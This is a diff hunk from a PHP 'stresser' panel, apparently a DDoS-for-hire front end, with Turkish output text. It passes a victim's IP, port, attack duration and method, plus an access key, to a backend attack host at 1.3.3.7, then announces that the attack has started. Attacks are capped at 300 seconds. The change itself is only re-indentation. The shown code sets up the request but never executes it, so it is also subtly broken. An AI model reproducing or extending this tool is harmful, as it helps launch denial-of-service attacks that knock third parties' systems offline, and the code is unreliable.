@@ -28,15 +28,15 @@ Tek Sayfalık Stresser Projesi / One Page Stresser Project
 
 				$dogukanbey = curl_init();
 				curl_setopt($dogukanbey, CURLOPT_URL, "http://1.3.3.7/dogukanbe.php?ip=$host&port=$port&time=$time&method=$method&key=dogukanbey1337");
-                curl_setopt($dogukanbey, CURLOPT_TIMEOUT, 5);
-                curl_setopt($dogukanbey, CURLOPT_CONNECTTIMEOUT, 10);
-                curl_setopt($dogukanbey, CURLOPT_REFERER, "https://google.com");
-                curl_setopt($dogukanbey, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-                curl_setopt($dogukanbey, CURLOPT_RETURNTRANSFER, true);
-                curl_setopt($dogukanbey, CURLOPT_POST, true);
-                curl_close($dogukanbey);
-              	echo "<h4 style=\"color:green; text-align: center;\">"; echo $host; echo " adresine "; echo $time; echo " saniye "; echo $method; echo " methoduyla saldırı başladı!"; echo "</h4>";
-               	header("Refresh: 2; url=index.php");
+				curl_setopt($dogukanbey, CURLOPT_TIMEOUT, 5);
+				curl_setopt($dogukanbey, CURLOPT_CONNECTTIMEOUT, 10);
+				curl_setopt($dogukanbey, CURLOPT_REFERER, "https://google.com");
+				curl_setopt($dogukanbey, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+				curl_setopt($dogukanbey, CURLOPT_RETURNTRANSFER, true);
+				curl_setopt($dogukanbey, CURLOPT_POST, true);
+				curl_close($dogukanbey);
+				echo "<h4 style=\"color:green; text-align: center;\">"; echo $host; echo " adresine "; echo $time; echo " saniye "; echo $method; echo " methoduyla saldırı başladı!"; echo "</h4>";
+				header("Refresh: 2; url=index.php");
            }else{
            	echo "<h4 style=\"color:red; text-align: center;\">Max 300 saniye saldırabilirsiniz!</h4>";
            	header("Refresh: 2; url=index.php");
